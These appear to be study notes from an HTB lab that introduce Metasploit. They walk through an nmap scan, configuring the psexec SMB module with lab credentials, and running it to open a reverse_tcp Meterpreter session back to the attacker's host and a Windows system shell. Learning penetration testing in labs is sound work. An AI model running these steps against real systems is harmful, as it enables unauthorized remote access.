
# Metasploit and Exploitation Overview

## Introduction to Metasploit

Metasploit is a powerful, automated attack framework developed by Rapid7 that simplifies exploiting vulnerabilities through pre-built modules. It allows security professionals and penetration testers to efficiently deliver payloads and gain control over vulnerable systems. While the community edition is freely available, many organizations use the paid Metasploit Pro for advanced features.

> **Note:** Experimenting with Metasploit in lab environments helps build foundational skills. In real engagements, understanding the tools' effects is crucial to avoid destructive actions.

---

## Starting Metasploit

Launch the framework console as root:

```bash
LeDaav@htb[/htb]$ sudo msfconsole
```


- Displays a banner with ASCII art.
- Shows the number of available exploits, payloads, encoders, etc.
- Example output:

```
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]
```

---

## Using Metasploit for Exploitation

### Reconnaissance with Nmap

Perform an Nmap scan to identify open ports and services:

```bash
bash

LeDaav@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
```

- Detects Windows services like SMB (port 445), RPC, etc.
- Helps determine the OS and potential attack vectors.

### Searching for Modules

Search for SMB-related modules:

```bash
bash

msf6 > search smb
```

- Lists modules related to SMB vulnerabilities, such as MS17-010.

### Selecting a Module

Choose a module by its number (e.g., 56):

```bash
bash

msf6 > use 56
```

- Defaults to `windows/meterpreter/reverse_tcp` payload.
- The prompt changes to:

```bash
bash

msf6 exploit(windows/smb/psexec) >
```

### Configuring the Module

Set required options:

```bash
bash

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
```

- `RHOSTS`: Target IP.
- `SHARE`: Administrative share.
- `SMBPass` and `SMBUser`: Credentials.
- `LHOST`: Attacker's IP.

### Running the Exploit

Execute:

```bash
bash

msf6 exploit(windows/smb/psexec) > exploit
```

- Shows progress and success messages.
- Establishes a Meterpreter session:

```


[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675)
```

### Interacting with the Session

- Meterpreter provides advanced control:

```bash
bash

meterpreter > 
```

- Drop into a system shell:

```bash
bash

meterpreter > shell
```

- Example output:

```
C:\WINDOWS\system32>
```